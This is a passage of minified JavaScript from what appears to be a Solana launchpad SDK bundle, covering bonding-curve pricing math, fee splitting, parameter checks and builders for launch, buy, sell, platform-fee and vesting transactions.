          initOutput: t.virtualA,
        });
      }
      static buyExactOut({ poolInfo: t, amount: e }) {
        return this.getAmountIn({
          amountOut: e,
          initInput: t.virtualB,
          initOutput: t.virtualA,
        });
      }
      static sellExactIn({ poolInfo: t, amount: e }) {
        return this.getAmountOut({
          amountIn: e,
          initInput: t.virtualA,
          initOutput: t.virtualB,
        });
      }
      static sellExactOut({ poolInfo: t, amount: e }) {
        return this.getAmountIn({
          amountOut: e,
          initInput: t.virtualA,
          initOutput: t.virtualB,
        });
      }
      static getAmountOut({ amountIn: t, initInput: e, initOutput: n }) {
        return n.mul(t).div(e);
      }
      static getAmountIn({ amountOut: t, initInput: e, initOutput: n }) {
        return W_(e.mul(t), n);
      }
    },
    yP = class {
      static _multipler(t) {
        return new mI(10).pow(t);
      }
      static getPrice({ priceX64: t, decimalA: e, decimalB: n }) {
        return new mI(t.toString())
          .div(this._Q64)
          .mul(this._multipler(e))
          .div(this._multipler(n));
      }
      static getPriceX64({ price: t, decimalA: e, decimalB: n }) {
        let r = t.mul(this._multipler(n)).div(this._multipler(e));
        return new Zn(r.mul(this._Q64).toFixed(0));
      }
    };
  yP._Q64 = new mI(new Zn(1).shln(64).toString());
  var wP = class extends pP {
      static getPoolInitPriceByPool({ poolInfo: t, decimalA: e, decimalB: n }) {
        return new mI(0);
      }
      static getPoolInitPriceByInit({ a: t, b: e, decimalA: n, decimalB: r }) {
        return new mI(0);
      }
      static getPoolPrice({ poolInfo: t, decimalA: e, decimalB: n }) {
        return new mI(t.virtualA.mul(t.realA).toString())
          .div(yP._Q64)
          .mul(10 ** (e - n));
      }
      static getPoolEndPrice({
        supply: t,
        totalSell: e,
        totalLockedAmount: n,
        totalFundRaising: r,
        migrateFee: o,
        decimalA: i,
        decimalB: s,
      }) {
        return new mI(r.sub(o).toString())
          .div(t.sub(e).sub(n).toString())
          .mul(10 ** (i - s));
      }
      static getPoolEndPriceReal({ poolInfo: t, decimalA: e, decimalB: n }) {
        let r = t.totalSellA.sub(t.realA),
          o = t.totalFundRaisingB.sub(t.realB);
        return new mI(t.virtualB.add(t.realB).add(o).toString())
          .div(t.virtualA.sub(t.realA).add(r).toString())
          .mul(10 ** (e - n));
      }
      static getInitParam({
        supply: t,
        totalFundRaising: e,
        totalSell: n,
        totalLockedAmount: r,
        migrateFee: o,
      }) {
        let i = t.sub(r);
        if (i.lte(new Zn(0))) throw Error("supplyMinusLocked need gt 0");
        let s = e.mul(new Zn(3)).sub(o),
          a = e.mul(new Zn(2)).mul(i).div(s),
          u = a.mul(a),
          c = e.mul(new Zn(2)).mul(jC).div(u);
        if (!c.gt(new Zn(0))) throw Error("a need gt 0");
        if (!VC.gt(c)) throw Error("a need lt u64 max");
        return { a: c, b: new Zn(0), c: a };
      }
      static buyExactIn({ poolInfo: t, amount: e }) {
        let n = t.realB.add(e),
          r = new Zn(2).mul(n).mul(jC).div(t.virtualA);
        return new Zn(new mI(r.toString()).sqrt().toFixed(0)).sub(t.realA);
      }
      static buyExactOut({ poolInfo: t, amount: e }) {
        let n = t.realA.add(e),
          r = n.mul(n),
          { div: o, mod: i } = t.virtualA.mul(r).divmod(new Zn(2).mul(jC));
        return (i.isZero() ? o : o.add(new Zn(1))).sub(t.realB);
      }
      static sellExactIn({ poolInfo: t, amount: e }) {
        let n = t.realA.sub(e),
          r = n.mul(n),
          { div: o, mod: i } = t.virtualA.mul(r).divmod(new Zn(2).mul(jC)),
          s = i.isZero() ? o : o.add(new Zn(1));
        return t.realB.sub(s);
      }
      static sellExactOut({ poolInfo: t, amount: e }) {
        let n = t.realB.sub(e),
          r = new Zn(2).mul(n).mul(jC).div(t.virtualA),
          o = new Zn(new mI(r.toString()).sqrt().toFixed(0));
        return t.realA.sub(o);
      }
    },
    bP = class {
      static getPoolCurvePointByPoolInfo({
        curveType: t,
        pointCount: e,
        poolInfo: n,
      }) {
        return this.getPoolCurvePointByInit({
          curveType: t,
          pointCount: e,
          supply: n.supply,
          totalFundRaising: n.totalFundRaisingB,
          totalSell: n.totalSellA,
          totalLockedAmount: n.vestingSchedule.totalLockedAmount,
          migrateFee: n.migrateFee,
          decimalA: n.mintDecimalsA,
          decimalB: n.mintDecimalsB,
        });
      }
      static getPoolCurvePointByInit({
        curveType: t,
        pointCount: e,
        supply: n,
        totalFundRaising: r,
        totalSell: o,
        totalLockedAmount: i,
        migrateFee: s,
        decimalA: a,
        decimalB: u,
      }) {
        if (e < 3) throw Error("point count < 3");
        let c = this.getCurve(t),
          l = c.getInitParam({
            supply: n,
            totalFundRaising: r,
            totalSell: o,
            totalLockedAmount: i,
            migrateFee: s,
          }),
          d = c.getPoolInitPriceByInit(
            AA(vA({}, l), { decimalA: a, decimalB: u })
          ),
          f = r.div(new Zn(e - 1)),
          h = new Zn(0),
          p = [{ price: d, totalSellSupply: 0 }],
          { a: m, b: g } = l,
          y = h,
          w = h;
        for (let b = 1; b < e; b++) {
          let n = b !== e - 1 ? f : r.sub(w),
            i = this.buyExactIn({
              poolInfo: {
                virtualA: m,
                virtualB: g,
                realA: y,
                realB: w,
                totalFundRaisingB: r,
                totalSellA: o,
              },
              amountB: n,
              protocolFeeRate: h,
              platformFeeRate: h,
              curveType: t,
              shareFeeRate: h,
            });
          (y = y.add(i.amountA)), (w = w.add(i.amountB));
          let s = this.getPrice({
            poolInfo: { virtualA: m, virtualB: g, realA: y, realB: w },
            decimalA: a,
            decimalB: u,
            curveType: t,
          });
          p.push({
            price: s,
            totalSellSupply: new mI(y.toString()).div(10 ** a).toNumber(),
          });
        }
        return p;
      }
      static getPoolInitPriceByPool({
        poolInfo: t,
        decimalA: e,
        decimalB: n,
        curveType: r,
      }) {
        return this.getCurve(r).getPoolInitPriceByPool({
          poolInfo: t,
          decimalA: e,
          decimalB: n,
        });
      }
      static getPoolInitPriceByInit({
        a: t,
        b: e,
        decimalA: n,
        decimalB: r,
        curveType: o,
      }) {
        return this.getCurve(o).getPoolInitPriceByInit({
          a: t,
          b: e,
          decimalA: n,
          decimalB: r,
        });
      }
      static getPrice({ poolInfo: t, curveType: e, decimalA: n, decimalB: r }) {
        return this.getCurve(e).getPoolPrice({
          poolInfo: t,
          decimalA: n,
          decimalB: r,
        });
      }
      static getEndPrice({
        poolInfo: t,
        curveType: e,
        decimalA: n,
        decimalB: r,
      }) {
        return this.getCurve(e).getPoolPrice({
          poolInfo: t,
          decimalA: n,
          decimalB: r,
        });
      }
      static getPoolEndPriceReal({
        poolInfo: t,
        curveType: e,
        decimalA: n,
        decimalB: r,
      }) {
        return this.getCurve(e).getPoolEndPriceReal({
          poolInfo: t,
          decimalA: n,
          decimalB: r,
        });
      }
      static checkParam({
        supply: t,
        totalFundRaising: e,
        totalSell: n,
        totalLockedAmount: r,
        decimals: o,
        config: i,
        migrateType: s,
      }) {
        if (6 !== Number(o)) throw Error("decimals = 6");
        if (t.mul(i.maxLockRate).div(V_).lt(r))
          throw Error("total lock amount gte max lock amount");
        if (t.lt(i.minSupplyA.mul(new Zn(10 ** o))))
          throw Error("supply lt min supply");
        let a = t.mul(i.minSellRateA).div(V_);
        if (n.lt(a)) throw Error("invalid input");
        if (e.lt(i.minFundRaisingB))
          throw Error("total fund raising lt min fund raising");
        let u = t.sub(n).sub(r),
          c = t.mul(i.minMigrateRateA).div(V_);
        if (u.lt(c)) throw Error("migrate lt min migrate amount");
        let l = t.sub(n).sub(r),
          d = new Zn(new mI(l.mul(e).toString()).sqrt().toFixed(0));
        if ("amm" === s) {
          let t = new Zn(10).pow(new Zn(o));
          if (d.lte(t)) throw Error("check migrate lp error");
        } else {
          if ("cpmm" !== s) throw Error("migrate type error");
          {
            let t = new Zn(100);
            if (d.lte(t)) throw Error("check migrate lp error");
          }
        }
      }
      static buyExactIn({
        poolInfo: t,
        amountB: e,
        protocolFeeRate: n,
        platformFeeRate: r,
        curveType: o,
        shareFeeRate: i,
      }) {
        let s,
          a,
          u,
          c = n.add(i).add(r),
          l = this.calculateFee({ amount: e, feeRate: c }),
          d = e.sub(l),
          f = this.getCurve(o),
          h = f.buyExactIn({ poolInfo: t, amount: d }),
          p = t.totalSellA.sub(t.realA);
        if (h.gt(p)) {
          s = p;
          let e = f.buyExactOut({ poolInfo: t, amount: s });
          (a = this.calculatePreFee({ postFeeAmount: e, feeRate: c })),
            (u = a.sub(e));
        } else (s = h), (a = e), (u = l);
        return {
          amountA: s,
          amountB: a,
          splitFee: this.splitFee({
            totalFee: u,
            protocolFeeRate: n,
            platformFeeRate: r,
            shareFeeRate: i,
          }),
        };
      }
      static buyExactOut({
        poolInfo: t,
        amountA: e,
        protocolFeeRate: n,
        platformFeeRate: r,
        curveType: o,
        shareFeeRate: i,
      }) {
        let s = t.totalSellA.sub(t.realA),
          a = e;
        e.gt(s) && (a = s);
        let u = this.getCurve(o).buyExactOut({ poolInfo: t, amount: e }),
          c = n.add(i).add(r),
          l = this.calculatePreFee({ postFeeAmount: u, feeRate: c }),
          d = l.sub(u);
        return {
          amountA: a,
          amountB: l,
          splitFee: this.splitFee({
            totalFee: d,
            protocolFeeRate: n,
            platformFeeRate: r,
            shareFeeRate: i,
          }),
        };
      }
      static sellExactIn({
        poolInfo: t,
        amountA: e,
        protocolFeeRate: n,
        platformFeeRate: r,
        curveType: o,
        shareFeeRate: i,
      }) {
        let s = this.getCurve(o).sellExactIn({ poolInfo: t, amount: e }),
          a = this.calculateFee({ amount: s, feeRate: n.add(i).add(r) }),
          u = this.splitFee({
            totalFee: a,
            protocolFeeRate: n,
            platformFeeRate: r,
            shareFeeRate: i,
          });
        return { amountA: e, amountB: s.sub(a), splitFee: u };
      }
      static sellExactOut({
        poolInfo: t,
        amountB: e,
        protocolFeeRate: n,
        platformFeeRate: r,
        curveType: o,
        shareFeeRate: i,
      }) {
        let s = n.add(i).add(r),
          a = this.calculatePreFee({ postFeeAmount: e, feeRate: s });
        if (t.realB.lt(a)) throw Error("Insufficient liquidity");
        let u = a.sub(e),
          c = bP.getCurve(o).sellExactOut({ poolInfo: t, amount: a });
        if (c.gt(t.realA)) throw Error();
        return {
          amountA: c,
          amountB: e,
          splitFee: this.splitFee({
            totalFee: u,
            protocolFeeRate: n,
            platformFeeRate: r,
            shareFeeRate: i,
          }),
        };
      }
      static splitFee({
        totalFee: t,
        protocolFeeRate: e,
        platformFeeRate: n,
        shareFeeRate: r,
      }) {
        let o = e.add(n).add(r),
          i = o.isZero() ? new Zn(0) : t.mul(n).div(o),
          s = o.isZero() ? new Zn(0) : t.mul(r).div(o);
        return { platformFee: i, shareFee: s, protocolFee: t.sub(i).sub(s) };
      }
      static calculateFee({ amount: t, feeRate: e }) {
        return rS(t, e, V_);
      }
      static calculatePreFee({ postFeeAmount: t, feeRate: e }) {
        if (e.isZero()) return t;
        let n = t.mul(V_),
          r = V_.sub(e);
        return n.add(r).sub(new Zn(1)).div(r);
      }
      static getCurve(t) {
        switch (t) {
          case 0:
            return mP;
          case 1:
            return gP;
          case 2:
            return wP;
        }
        throw Error("find curve error");
      }
    },
    vP = {
      initPriceX64: new Zn("515752397214619"),
      supply: new Zn(1e15),
      totalSellA: new Zn(7931e11),
      totalFundRaisingB: new Zn(85e9),
      totalLockedAmount: new Zn("0"),
      cliffPeriod: new Zn("0"),
      unlockPeriod: new Zn("0"),
      virtualA: new Zn("1073471847374405"),
      virtualB: new Zn("30050573465"),
      realA: new Zn(0),
      realB: new Zn(0),
      protocolFee: new Zn(0),
      platformId: new Xi("4Bu96XjU84XjPDSpveTVf6LYGCkfW5FK7SNkREWcEfV4"),
      vestingSchedule: {
        totalLockedAmount: new Zn(0),
        cliffPeriod: new Zn(0),
        unlockPeriod: new Zn(0),
        startTime: new Zn(0),
        totalAllocatedShare: new Zn(0),
      },
    },
    AP = new Zn(1e4),
    kP = class extends iT {
      constructor(t) {
        super(t);
      }
      async createLaunchpad(t) {
        var e,
          n,
          r,
          o,
          i,
          s,
          a = t,
          {
            programId: u = M_,
            authProgramId: c,
            platformId: l = vP.platformId,
            mintA: d,
            decimals: f = 6,
            mintBDecimals: h = 9,
            name: p,
            symbol: m,
            uri: g,
            migrateType: y,
            configId: w,
            configInfo: b,
            platformFeeRate: v,
            txVersion: A,
            computeBudgetConfig: k,
            txTipConfig: I,
            feePayer: S,
            buyAmount: _,
            minMintAAmount: T,
            slippage: C,
            associatedOnly: B = !0,
            checkCreateATAOwner: E = !1,
            extraSigners: x,
          } = a,
          P = kA(a, [
            "programId",
            "authProgramId",
            "platformId",
            "mintA",
            "decimals",
            "mintBDecimals",
            "name",
            "symbol",
            "uri",
            "migrateType",
            "configId",
            "configInfo",
            "platformFeeRate",
            "txVersion",
            "computeBudgetConfig",
            "txTipConfig",
            "feePayer",
            "buyAmount",
            "minMintAAmount",
            "slippage",
            "associatedOnly",
            "checkCreateATAOwner",
            "extraSigners",
          ]);
        let R = this.createTxBuilder(S);
        c = null != c ? c : Xx(u).publicKey;
        let O = b;
        if (!O && w) {
          let t = await this.scope.connection.getAccountInfo(w);
          t && (O = lP.decode(t.data));
        }
        O || this.logAndCreateError("config not found");
        let M = O.mintB,
          L = O.curveType,
          { publicKey: N } = Zx(u, d, M),
          { publicKey: D } = Jx(u, N, d),
          { publicKey: U } = Jx(u, N, M),
          { publicKey: q } = vB(d);
        void 0,
          m.length > 10 &&
            this.logAndCreateError("Symbol length should shorter than 11"),
          g || this.logAndCreateError("uri should not empty"),
          _.lte(new Zn(0)) &&
            this.logAndCreateError("buy amount should gt 0:", _.toString());
        let W = null != (e = null == P ? void 0 : P.supply) ? e : vP.supply,
          z =
            null != (n = null == P ? void 0 : P.totalSellA) ? n : vP.totalSellA,
          K =
            null != (r = null == P ? void 0 : P.totalFundRaisingB)
              ? r
              : vP.totalFundRaisingB,
          F =
            null != (o = null == P ? void 0 : P.totalLockedAmount)
              ? o
              : new Zn(0),
          j = v;
        if (!v) {
          let t = await this.scope.connection.getAccountInfo(l);
          t || this.logAndCreateError("platform id not found:", l.toString()),
            (j = hP.decode(t.data).feeRate);
        }
        let G = bP
            .getCurve(O.curveType)
            .getInitParam({
              supply: W,
              totalFundRaising: K,
              totalSell: z,
              totalLockedAmount: F,
              migrateFee: O.migrateFee,
            }),
          V = {
            epoch: new Zn(896),
            bump: 254,
            status: 0,
            mintDecimalsA: f,
            mintDecimalsB: h,
            supply: W,
            totalSellA: z,
            mintA: new Xi(d),
            mintB: M,
            virtualA: G.a,
            virtualB: G.b,
            realA: vP.realA,
            realB: vP.realB,
            migrateFee: O.migrateFee,
            migrateType: "amm" === y ? 0 : 1,
            protocolFee: vP.protocolFee,
            platformFee: j,
            platformId: l,
            configId: w,
            vaultA: D,
            vaultB: U,
            creator: this.scope.ownerPubKey,
            totalFundRaisingB: K,
            vestingSchedule: {
              totalLockedAmount: F,
              cliffPeriod: new Zn(0),
              unlockPeriod: new Zn(0),
              startTime: new Zn(0),
              totalAllocatedShare: new Zn(0),
            },
          },
          H = bP.getCurve(O.curveType),
          { c: X } = H.getInitParam({
            supply: V.supply,
            totalFundRaising: V.totalFundRaisingB,
            totalLockedAmount: F,
            totalSell: 0 === O.curveType ? V.totalSellA : new Zn(0),
            migrateFee: O.migrateFee,
          });
        try {
          bP.checkParam({
            supply: V.supply,
            totalFundRaising: V.totalFundRaisingB,
            totalSell: X,
            totalLockedAmount: F,
            decimals: V.mintDecimalsA,
            config: O,
            migrateType: y,
          }),
            void 0;
        } catch (Y) {
          this.logAndCreateError(
            `check create mint params failed, ${Y.message}`
          );
        }
        R.addInstruction({
          instructions: [
            nP(
              u,
              null != S ? S : this.scope.ownerPubKey,
              this.scope.ownerPubKey,
              w,
              l,
              c,
              N,
              d,
              M,
              D,
              U,
              q,
              _c,
              _c,
              f,
              p,
              m,
              g || "https://",
              {
                type:
                  0 === L
                    ? "ConstantCurve"
                    : 1 === L
                    ? "FixedCurve"
                    : 2 === L
                    ? "LinearCurve"
                    : "ConstantCurve",
                totalSellA: z,
                migrateType: y,
                supply: W,
                totalFundRaisingB: K,
              },
              F,
              null != (i = null == P ? void 0 : P.cliffPeriod) ? i : new Zn(0),
              null != (s = null == P ? void 0 : P.unlockPeriod) ? s : new Zn(0)
            ),
          ],
        });
        let Z,
          J = new Zn(0);
        if (
          (null != x && x.length && R.addInstruction({ signers: x }),
          !P.createOnly)
        ) {
          let { builder: t, extInfo: e } = await this.buyToken({
            programId: u,
            authProgramId: c,
            mintA: d,
            mintB: M,
            poolInfo: V,
            buyAmount: _,
            minMintAAmount: T,
            shareFeeRate: P.shareFeeRate,
            shareFeeReceiver: P.shareFeeReceiver,
            configInfo: O,
            platformFeeRate: j,
            slippage: C,
            associatedOnly: B,
            checkCreateATAOwner: E,
          });
          R.addInstruction(vA({}, t.AllTxData)),
            (J = e.outAmount),
            (Z =
              ("devnet" !== this.scope.cluster && 1 !== A) ||
              !P.shareFeeReceiver
                ? void 0
                : [t.allInstructions[0]]);
        }
        return (
          R.addTipInstruction(I),
          0 === A
            ? R.sizeCheckBuildV0({
                computeBudgetConfig: k,
                outAmount: J,
                splitIns: Z,
                address: AA(vA({}, V), { poolId: N }),
              })
            : R.sizeCheckBuild({
                computeBudgetConfig: k,
                outAmount: J,
                splitIns: Z,
                address: AA(vA({}, V), { poolId: N }),
              })
        );
      }
      async buyToken({
        programId: t = M_,
        authProgramId: e,
        mintA: n,
        mintB: r = Bc,
        poolInfo: o,
        configInfo: i,
        platformFeeRate: s,
        txVersion: a,
        computeBudgetConfig: u,
        txTipConfig: c,
        feePayer: l,
        buyAmount: d,
        minMintAAmount: f,
        slippage: h,
        shareFeeRate: p = new Zn(0),
        shareFeeReceiver: m,
        associatedOnly: g = !0,
        checkCreateATAOwner: y = !1,
      }) {
        d.lte(new Zn(0)) &&
          this.logAndCreateError("buy amount should gt 0:", d.toString());
        let w = this.createTxBuilder(l),
          { publicKey: b } = Zx(t, n, r);
        e = null != e ? e : Xx(t).publicKey;
        let v = null,
          A = null,
          k = r.equals(Bc),
          { account: I, instructionParams: S } =
            await this.scope.account.getOrCreateTokenAccount({
              mint: n,
              owner: this.scope.ownerPubKey,
              createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
              skipCloseAccount: !0,
              notUseTokenAccount: !1,
              associatedOnly: g,
              checkCreateATAOwner: y,
            });
        I && (v = I),
          w.addInstruction(S || {}),
          void 0 === v &&
            this.logAndCreateError(
              `cannot found mintA(${n.toBase58()}) token accounts`,
              "tokenAccounts",
              this.scope.account.tokenAccounts
            );
        let { account: _, instructionParams: T } =
          await this.scope.account.getOrCreateTokenAccount({
            mint: r,
            owner: this.scope.ownerPubKey,
            createInfo: k
              ? { payer: this.scope.ownerPubKey, amount: d }
              : void 0,
            skipCloseAccount: !k,
            notUseTokenAccount: k,
            associatedOnly: !k && g,
            checkCreateATAOwner: y,
          });
        _ && (A = _),
          w.addInstruction(T || {}),
          void 0 === A &&
            this.logAndCreateError(
              `cannot found mintB(${r.toBase58()}) token accounts`,
              "tokenAccounts",
              this.scope.account.tokenAccounts
            );
        let C = o;
        if (!C) {
          let t = await this.scope.connection.getAccountInfo(b, {
            commitment: "processed",
          });
          t || this.logAndCreateError("cannot found pool:", b.toBase58()),
            (C = fP.decode(t.data));
        }
        let B = i,
          E = await xA(
            this.scope.connection,
            [B ? void 0 : C.configId, s ? void 0 : C.platformId]
              .filter(Boolean)
              .map((t) => ({ pubkey: t }))
          );
        if (!B) {
          let t = E.find((t) => t.pubkey.equals(C.configId));
          (!t || !t.accountInfo) &&
            this.logAndCreateError("config not found: ", C.configId.toBase58()),
            (B = lP.decode(t.accountInfo.data));
        }
        if (!s) {
          let t = E.find((t) => t.pubkey.equals(C.platformId));
          (!t || !t.accountInfo) &&
            this.logAndCreateError(
              "platform info not found: ",
              C.configId.toBase58()
            ),
            (s = hP.decode(t.accountInfo.data).feeRate);
        }
        let x = bP.buyExactIn({
            poolInfo: C,
            amountB: d,
            protocolFeeRate: B.tradeFeeRate,
            platformFeeRate: s,
            curveType: B.curveType,
            shareFeeRate: p,
          }),
          P = new mI(x.amountA.toString()),
          R = h
            ? new mI(AP.sub(h).toNumber() / AP.toNumber()).clampedTo(0, 1)
            : new mI(1),
          O = null != f ? f : h ? new Zn(P.mul(R).toFixed(0)) : x.amountA;
        x.amountB.lt(d), 0;
        let M = m ? h_(m, r, _c).publicKey : void 0;
        return (
          M &&
            w.addInstruction({
              instructions: [bl(this.scope.ownerPubKey, M, m, r)],
            }),
          w.addInstruction({
            instructions: [
              rP(
                t,
                this.scope.ownerPubKey,
                e,
                C.configId,
                C.platformId,
                b,
                v,
                A,
                C.vaultA,
                C.vaultB,
                n,
                r,
                _c,
                _c,
                x.amountB.lt(d) ? x.amountB : d,
                O,
                p,
                M
              ),
            ],
          }),
          w.addCustomComputeBudget(u),
          w.addTipInstruction(c),
          w.versionBuild({ txVersion: a, extInfo: { outAmount: O } })
        );
      }
      async sellToken({
        programId: t = M_,
        authProgramId: e,
        mintA: n,
        mintB: r = Bc,
        poolInfo: o,
        configInfo: i,
        platformFeeRate: s,
        txVersion: a,
        computeBudgetConfig: u,
        txTipConfig: c,
        feePayer: l,
        sellAmount: d,
        minAmountB: f,
        slippage: h,
        shareFeeRate: p = new Zn(0),
        shareFeeReceiver: m,
        associatedOnly: g = !0,
        checkCreateATAOwner: y = !1,
      }) {
        e = null != e ? e : Xx(t).publicKey;
        let w = this.createTxBuilder(l);
        d.lte(new Zn(0)) &&
          this.logAndCreateError("sell amount should be gt 0");
        let { publicKey: b } = Zx(t, n, r),
          v = null,
          A = null,
          k = r.equals(Bc),
          { account: I, instructionParams: S } =
            await this.scope.account.getOrCreateTokenAccount({
              mint: n,
              owner: this.scope.ownerPubKey,
              createInfo: void 0,
              skipCloseAccount: !0,
              notUseTokenAccount: !1,
              associatedOnly: g,
              checkCreateATAOwner: y,
            });
        I && (v = I),
          w.addInstruction(S || {}),
          void 0 === v &&
            this.logAndCreateError(
              "cannot found mintA token accounts",
              "tokenAccounts",
              this.scope.account.tokenAccounts
            );
        let { account: _, instructionParams: T } =
          await this.scope.account.getOrCreateTokenAccount({
            mint: r,
            owner: this.scope.ownerPubKey,
            createInfo: k
              ? { payer: this.scope.ownerPubKey, amount: 0 }
              : void 0,
            skipCloseAccount: !k,
            notUseTokenAccount: k,
            associatedOnly: !k && g,
            checkCreateATAOwner: y,
          });
        _ && (A = _),
          w.addInstruction(T || {}),
          void 0 === A &&
            this.logAndCreateError(
              "cannot found mintB token accounts",
              "tokenAccounts",
              this.scope.account.tokenAccounts
            );
        let C = o;
        if (!C) {
          let t = await this.scope.connection.getAccountInfo(b, {
            commitment: "processed",
          });
          t || this.logAndCreateError("cannot found pool", b.toBase58()),
            (C = fP.decode(t.data));
        }
        let B = i,
          E = await xA(
            this.scope.connection,
            [B ? void 0 : C.configId, s ? void 0 : C.platformId]
              .filter(Boolean)
              .map((t) => ({ pubkey: t }))
          );
        if (!B) {
          let t = E.find((t) => t.pubkey.equals(C.configId));
          (!t || !t.accountInfo) &&
            this.logAndCreateError("config not found: ", C.configId.toBase58()),
            (B = lP.decode(t.accountInfo.data));
        }
        if (!s) {
          let t = E.find((t) => t.pubkey.equals(C.platformId));
          (!t || !t.accountInfo) &&
            this.logAndCreateError(
              "platform info not found: ",
              C.configId.toBase58()
            ),
            (s = hP.decode(t.accountInfo.data).feeRate);
        }
        let x = bP.sellExactIn({
            poolInfo: C,
            amountA: d,
            protocolFeeRate: B.tradeFeeRate,
            platformFeeRate: s,
            curveType: B.curveType,
            shareFeeRate: p,
          }),
          P = new mI(x.amountB.toString()),
          R = h
            ? new mI(AP.sub(h).toNumber() / AP.toNumber()).clampedTo(0, 1)
            : new mI(1),
          O = null != f ? f : h ? new Zn(P.mul(R).toFixed(0)) : x.amountB;
        O.lte(new Zn(0)) &&
          this.logAndCreateError(`out ${r.toBase58()} amount should be gt 0`);
        let M = m ? h_(m, r, _c).publicKey : void 0;
        return (
          M &&
            w.addInstruction({
              instructions: [bl(this.scope.ownerPubKey, M, m, r)],
            }),
          w.addInstruction({
            instructions: [
              oP(
                t,
                this.scope.ownerPubKey,
                e,
                C.configId,
                C.platformId,
                b,
                v,
                A,
                C.vaultA,
                C.vaultB,
                n,
                r,
                _c,
                _c,
                x.amountA.lt(d) ? x.amountA : d,
                O,
                p,
                M
              ),
            ],
          }),
          w.addCustomComputeBudget(u),
          w.addTipInstruction(c),
          w.versionBuild({ txVersion: a, extInfo: { outAmount: O } })
        );
      }
      async createPlatformConfig({
        programId: t = M_,
        platformAdmin: e,
        platformClaimFeeWallet: n,
        platformLockNftWallet: r,
        cpConfigId: o,
        migrateCpLockNftScale: i,
        feeRate: s,
        name: a,
        web: u,
        img: c,
        txVersion: l,
        computeBudgetConfig: d,
        txTipConfig: f,
        feePayer: h,
      }) {
        let p = this.createTxBuilder(h),
          { publicKey: m } = $x(t, e);
        return (
          p.addInstruction({
            instructions: [uP(t, e, n, r, m, o, i, s, a, u, c)],
          }),
          p.addCustomComputeBudget(d),
          p.addTipInstruction(f),
          p.versionBuild({ txVersion: l, extInfo: { platformId: m } })
        );
      }
      async updatePlatformConfig({
        programId: t = M_,
        platformAdmin: e,
        platformId: n,
        updateInfo: r,
        txVersion: o,
        computeBudgetConfig: i,
        txTipConfig: s,
        feePayer: a,
      }) {
        let u = this.createTxBuilder(a),
          c = null != n ? n : $x(t, e).publicKey;
        return (
          u.addInstruction({ instructions: [cP(t, e, c, r)] }),
          u.addCustomComputeBudget(i),
          u.addTipInstruction(s),
          u.versionBuild({ txVersion: o })
        );
      }
      async claimPlatformFee({
        programId: t = M_,
        authProgramId: e,
        platformId: n,
        poolId: r,
        platformClaimFeeWallet: o,
        mintB: i,
        vaultB: s,
        mintBProgram: a = _c,
        txVersion: u,
        computeBudgetConfig: c,
        txTipConfig: l,
        feePayer: d,
      }) {
        var f;
        let h = this.createTxBuilder(d);
        e = null != e ? e : Xx(t).publicKey;
        let p = i,
          m = s;
        if (!p) {
          let t = await this.scope.connection.getAccountInfo(r, {
            commitment: "processed",
          });
          t || this.logAndCreateError("cannot found pool:", r.toBase58());
          let e = fP.decode(t.data),
            n = await this.scope.connection.getAccountInfo(e.configId, {
              commitment: "processed",
            });
          n ||
            this.logAndCreateError(
              "cannot found config:",
              e.configId.toBase58()
            ),
            (p = lP.decode(n.data).mintB),
            (m = null != m ? m : e.vaultB);
        }
        (!p || !m) &&
          this.logAndCreateError(
            "cannot found mint info, mintB: ",
            p.toBase58(),
            ", vaultB: ",
            null != (f = null == m ? void 0 : m.toBase58()) ? f : ""
          );
        let g = h_(this.scope.ownerPubKey, p, _c).publicKey;
        return (
          h.addInstruction({
            instructions: [
              bl(this.scope.ownerPubKey, g, this.scope.ownerPubKey, p),
            ],
          }),
          h.addInstruction({ instructions: [aP(t, o, e, r, n, m, g, p, a)] }),
          h.addCustomComputeBudget(c),
          h.addTipInstruction(l),
          h.versionBuild({ txVersion: u })
        );
      }
      async claimAllPlatformFee({
        programId: t = M_,
        authProgramId: e,
        platformId: n,
        platformClaimFeeWallet: r,
        txVersion: o,
        computeBudgetConfig: i,
        txTipConfig: s,
        feePayer: a,
      }) {
        let u = this.createTxBuilder(a);
        return (
          (e = null != e ? e : Xx(t).publicKey),
          (
            await this.scope.connection.getProgramAccounts(t, {
              filters: [
                { dataSize: fP.span },
                {
                  memcmp: {
                    offset: fP.offsetOf("platformId"),
                    bytes: n.toString(),
                  },
                },
              ],
            })
          ).forEach((o) => {
            let i = fP.decode(o.account.data),
              s = h_(this.scope.ownerPubKey, i.mintB, _c).publicKey;
            u.addInstruction({
              instructions: [
                bl(this.scope.ownerPubKey, s, this.scope.ownerPubKey, i.mintB),
              ],
            }),
              u.addInstruction({
                instructions: [
                  aP(t, r, e, o.pubkey, n, i.vaultB, s, i.mintB, _c),
                ],
              });
          }),
          u.addTipInstruction(s),
          0 === o
            ? u.sizeCheckBuildV0({ computeBudgetConfig: i })
            : u.sizeCheckBuild({ computeBudgetConfig: i })
        );
      }
      async createVesting({
        programId: t = M_,
        poolId: e,
        beneficiary: n,
        shareAmount: r,
        txVersion: o,
        computeBudgetConfig: i,
        txTipConfig: s,
        feePayer: a,
      }) {
        let u = this.createTxBuilder(a),
          c = tP(t, e, n).publicKey;
        return (
          u.addInstruction({
            instructions: [sP(t, this.scope.ownerPubKey, n, e, c, r)],
          }),
          u.addCustomComputeBudget(i),
          u.addTipInstruction(s),
          u.versionBuild({ txVersion: o })
        );
      }
      async claimVesting({
        programId: t = M_,
        poolId: e,
        poolInfo: n,
        txVersion: r,
        computeBudgetConfig: o,
        txTipConfig: i,
        feePayer: s,
        associatedOnly: a = !0,
        checkCreateATAOwner: u = !1,
      }) {
        let c = this.createTxBuilder(s),
          l = Xx(t).publicKey,
          d = tP(t, e, this.scope.ownerPubKey).publicKey,
          f = n;
        if (!f) {
          let t = await this.scope.connection.getAccountInfo(e);
          t || this.logAndCreateError("pool not found"),
            (f = fP.decode(t.data));
        }
        let h = h_(this.scope.ownerPubKey, f.mintA, _c).publicKey;
        return (
          c.addInstruction({
            instructions: [
              bl(this.scope.ownerPubKey, h, this.scope.ownerPubKey, f.mintA),
            ],
          }),
          c.addInstruction({
            instructions: [
              iP(t, this.scope.ownerPubKey, l, e, d, h, f.vaultA, f.mintA, _c),
            ],
          }),
          c.addCustomComputeBudget(o),
          c.addTipInstruction(i),
          c.versionBuild({ txVersion: r })
        );
      }
      async getRpcPoolInfo({ poolId: t }) {
        return (await this.getRpcPoolsInfo({ poolIdList: [t] })).poolInfoMap[
          t.toBase58()
        ];
      }
      async getRpcPoolsInfo({ poolIdList: t, config: e }) {
        let n = await xA(
            this.scope.connection,
            t.map((t) => ({ pubkey: t })),
            e
          ),
          r = {},
          o = [];
